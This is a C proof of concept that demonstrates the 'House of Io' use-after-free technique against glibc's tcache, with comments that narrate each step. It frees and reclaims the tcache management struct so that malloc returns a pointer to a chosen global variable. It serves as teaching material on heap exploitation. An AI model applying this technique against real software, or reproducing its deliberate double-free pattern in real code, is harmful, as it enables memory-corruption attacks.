#include <assert.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// House of Io - Use after free Variant
// ====================================
//
// Source: https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/
//
// Tested on libc versions 2.31, 2.32 and 2.33.
//
// House of Io makes use of the fact, that when freeing a chunk into the tcache
// the chunk will receive a pointer to the tcache management struct which has
// been allocated beforehand. This pointer is the tcache->key entry of a free'd
// tcache chunk. There are three different versions of this attack and all work
// even with safe-link enabled, as the tcache-key pointer, and more importantly
// the pointers in the tcache_perthread_struct, are not protected.

unsigned long global_var = 1;

struct overlay {
  uint64_t *next;
  uint64_t *key;
};

struct tcache_perthread_struct {
  uint16_t counts[64];
  uint64_t entries[64];
};

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  puts("In house of Io we make use of the fact, that a free'd tcache chunk\n"
       "gets a pointer to the tcache management struct inserted at the\n"
       "second slot.\n");

  puts(
      "This variant can be used when either the order of free's for a struct\n"
      "with multiple pointers is incorrect or the second slot in a free'd\n"
      "struct can be free'd again. This allows us to free the\n"
      "`tcache_perthread_struct` and gain access to it, by allocating it\n"
      "again. With access to the management struct we can insert a malicious\n"
      "pointer into a tcache and allocate from that bucket to get the pointer\n"
      "from malloc.\n");

  printf("Specifically we get a pointer to the `global_var` at %p returned to\n"
         "us from malloc.\n\n",
         &global_var);

  puts("First we have to allocate a struct, that has a pointer at offset\n"
       "+0x08.\n");
  struct overlay *ptr = malloc(sizeof(struct overlay));

  ptr->next = malloc(0x10);
  ptr->key = malloc(0x10);

  puts("Now we simulate a wrongful order of free's which leads to freeing the\n"
       "management struct. The first free puts the pointer to the tcache\n"
       "struct into ptr->key, which also gets free'd afterwards.\n");
  free(ptr);
  free(ptr->key);

  puts("With the management struct free'd we can allocate it again and get\n"
       "access to it.\n");
  struct tcache_perthread_struct *management_struct = malloc(0x285);

  puts(
      "Now that we have access to management struct, we first have to set the\n"
      "count of the tcache bin, from which we want to allocate our target\n"
      "chunk, to one.\n");
  management_struct->counts[0] = 1;

  puts(
      "In the next step we insert the pointer to the global variable into the\n"
      "tcache.\n");
  management_struct->entries[0] = (uint64_t)&global_var;

  printf(
      "After the write we have placed a pointer to the global variable into\n"
      "the tcache [ %p ].\n\n",
      management_struct->entries[0]);

  puts("If we now allocate a new chunk from that tcache bin we get a pointer\n"
       "to our target location.\n");
  uint64_t *evil_chunk = malloc(0x10);

  assert(evil_chunk == &global_var);
  return 0;
}
